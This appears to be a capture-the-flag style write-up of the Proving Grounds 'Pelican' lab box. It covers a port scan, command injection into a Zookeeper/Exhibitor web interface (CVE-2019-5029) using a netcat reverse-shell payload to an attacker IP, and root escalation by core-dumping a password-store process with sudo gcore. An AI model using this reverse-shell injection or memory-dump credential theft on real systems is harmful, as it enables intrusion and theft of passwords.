---
title: "PG Practice - Pelican"
date: 2026-04-06
draft: false
tags: ["Proving Grounds Practice", "Linux", "Write-Up"]
cover:
    image: "/images/writeup_screens/pg_pelican/pg_pelican_cover.svg"      
    alt: "PG Pelican Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| Difficulty | Intermediate |
| Type | Linux |

**Port Scan**
```
└─$ nmap -sV -p- 192.168.208.98   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 00:12 +0200
Nmap scan report for 192.168.208.98
Host is up (0.035s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp  open  http        Jetty 1.0
8081/tcp  open  http        nginx 1.14.2
46295/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Local.txt

As we can see in the port scan above, there are a lot of different services running on the target server. The most interesting one is the **Zookeeper** Service running on port **2181** and the web-interface for it on port **8080**. The running instance is vulnerable to **CVE-2019-5029** for which there is a [public exploit](https://x7331.gitbook.io/boxes/services/tcp/2181-zookeeper). After starting a **netcat** listener on my attacker machine, i carried out the exploit in the web-interface as follows:

`$(/bin/nc -e /bin/sh -i 192.168.45.155 80 &)`

![](/images/writeup_screens/pg_pelican/pg_pelican_web.png)

Shortly after, i received a reverse shell as user **charles** and was able to read _/home/charles/local.txt_

---

## Proof.txt

First of all, we should run `python3 -c 'import pty; pty.spawn("/bin/bash")'` in order to spawn an interactive **TTY** shell which is a lot more comfortable than the restricted shell we received per default. Next, we can check if we are able to run any commands with sudo permissions with `$ sudo -l`. This is indeed the case since the output shows that we can run `usr/bin/gcore` with sudo privileges without the need to supply a password for it:

![](/images/writeup_screens/pg_pelican/pg_pelican_sudol.png)

Looking for **gcore** in [GTFOBins](https://gtfobins.org/gtfobins/gcore/) shows, that we can create core dumps from running processes with the binary. To list all running processes we can simply use `$ ps aux`. Looking through the processes, the following line catched my eye:

```
root       490  0.0  0.0   2276    72 ?        Ss   18:07   0:00 /usr/bin/password-store
```

There is a password-store process running which is a minimalistic password manager for Linux systems. This is very interesting so i ran the following commands to create a core dump of the process with **gcore** and printing the strings found in the dump:

```
$ sudo gcore 490

$ strings core.490
```

This prints a lot of output but if we scroll up a little bit we can find the following two lines:

```
001 Password: root:
ClogKingpinInning731
```

This looks like the password for the root user in clear-text! Let's try to spawn a root shell with the obtained password:

![](/images/writeup_screens/pg_pelican/pg_pelican_root.png)

It worked and we can now read the flag _/root/proof.txt_.

